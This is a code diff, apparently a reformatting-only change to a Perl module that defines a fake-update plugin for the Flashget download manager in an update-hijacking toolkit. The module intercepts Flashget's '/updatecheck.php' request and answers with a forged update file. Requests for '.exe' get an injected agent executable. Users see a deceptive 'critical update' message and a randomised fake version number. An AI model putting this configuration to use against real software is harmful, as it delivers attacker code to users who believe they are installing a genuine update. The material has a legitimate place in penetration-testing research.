@@ -27,47 +27,52 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Flashget',
-    'version' => '1.0',
-    'appver'  => '',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
-    'description' => qq{},    
-    'vh' => '(www.flashget.com)',
-    'request' => [
-		    {
-		    'req' => '/updatecheck.php?', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 1,
-		    'file' => './include/flashget/flashget_fgupdate.ini',
-		    },
-		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'Flashget',
+    'version'     => '1.0',
+    'appver'      => '',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
+    'description' => qq{},
+    'vh'          => '(www.flashget.com)',
+    'request'     => [
+        {   'req'    => '/updatecheck.php?',    #regex friendly
+            'type'   => 'file',                 #file|string|agent|install
+            'method' => '',                     #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 1,
+            'file' => './include/flashget/flashget_fgupdate.ini',
+        },
+
+        {   'req'    => '.exe',                 #regex friendly
+            'type'   => 'agent',                #file|string|agent|install
+            'method' => '',                     #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		'description' => { 'val' => 'This critical update fix internal vulnerability',                                                                                 
-				'desc' => 'Description to be displayed during the update'},
-		'version'  => { 'val' => '\'7.2.\'.isrcore::utils::RndNum(2)',                                                                                                   
-                        	'hidden' => 1,                                                                                                                                   
-                              'dynamic' =>1,}, 
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'description' => {
+            'val'  => 'This critical update fix internal vulnerability',
+            'desc' => 'Description to be displayed during the update'
+        },
+        'version' => {
+            'val'     => '\'7.2.\'.isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+    }
 };
 
 ##########################################################################
@@ -80,5 +85,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
